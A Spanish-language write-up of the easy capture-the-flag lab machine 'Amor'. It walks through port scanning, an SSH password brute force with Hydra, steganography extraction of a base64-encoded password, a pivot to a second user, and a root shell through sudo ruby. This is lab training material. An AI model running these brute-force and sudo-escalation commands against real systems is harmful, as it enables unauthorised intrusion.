Maquina: Amor 

Autor: Romabri 

Dificultad: Facil

![Screenshot 2024-11-08 175752](https://github.com/user-attachments/assets/33acc24b-2e97-45e3-8bb2-d14f30cd9d81)

ping 172.17.0.2 -c 1

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2
Vemos que esta abierto el puerto 22 SSH y el puerto 80 HTTP

![Screenshot 2024-11-08 180010](https://github.com/user-attachments/assets/b598b689-02a7-4d65-9e03-5bee8c818a25)

accedemos a la pagina web
https://172.17.0.2

Usamos Gobuster para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio

Gobuster no ha encontrado nada pero en una de las entradas vemos algo interesante:
Tenemos dos usaurios

Hacemos un ataque de fuerza bruta con Hydra
hydra -l carlota -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2

![Screenshot 2024-11-08 180153](https://github.com/user-attachments/assets/ab2d2df2-3232-4e3d-bde7-7a695bb888d6)

Ahora accedemos vía SSH
ssh carlota@172.17.0.2

![Screenshot 2024-11-08 180743](https://github.com/user-attachments/assets/b3eff1f9-06e6-45a9-b73f-ce1b579acfeb)

vemos que hay este directorio /home/carlota/Desktop/fotos/vacaciones y en dicho directorio hay una imagen, la descargamos.

![Screenshot 2024-11-08 180814](https://github.com/user-attachments/assets/7e00d3f2-7601-41f2-b1da-034c40946ef1)

Este comando nos permite descargar archivos desde ssh

scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/ankb/Downloads/maquina

![Screenshot 2024-11-08 182114](https://github.com/user-attachments/assets/e79857a0-0a36-41a7-941a-49962a098885)

si abrimos la imagen nos encontramos esto:

![Screenshot 2024-11-08 183327](https://github.com/user-attachments/assets/bcfc0e00-8157-45d8-b8ca-cfd08ca56fbf)

Este comando nos extrae información oculta en la imagen
steghiede extract -sf imagen.jpg 

Nos pide que pongamos contraseña si no ponemos nada y damos a enter nos ha generado un archivo secret.txt. Dentro del archivo secret.txt encontramos algo cifrado en base 64

Lo desciframos de la siguiente forma: 

echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 --decode

Cuando hacemos esto nos aparece lo siguiente:

![Screenshot 2024-11-08 182325](https://github.com/user-attachments/assets/39545ad5-a3c3-45d7-81f3-7065e3235f53)

Podría ser una contraseña pero para el usuario Juan no funciona vamos a seguir mirando dentro del usuario Carlota

Si escribimos el comando env vemos algo extraño

El texto cita a un tal oscar vamos a probar la contraseña que hemos encontrado dentro de la imagen con este usuario

ssh oscar@172.17.0.2

![Screenshot 2024-11-08 182754](https://github.com/user-attachments/assets/7c1efb8d-3c61-4885-afba-a707bf9bda5b)

Vamos al escritorio de oscar y vemos un achivo con un texto

Si hacemos un sudo -l nos aparece lo siguiente

Ejecutamos el siguiente comando 

sudo /usr/bin/ruby -e 'exec "/bin/sh"'

Whoami

![Screenshot 2024-11-08 182832](https://github.com/user-attachments/assets/30645df0-a593-45b8-b80d-c18547ad53cb)
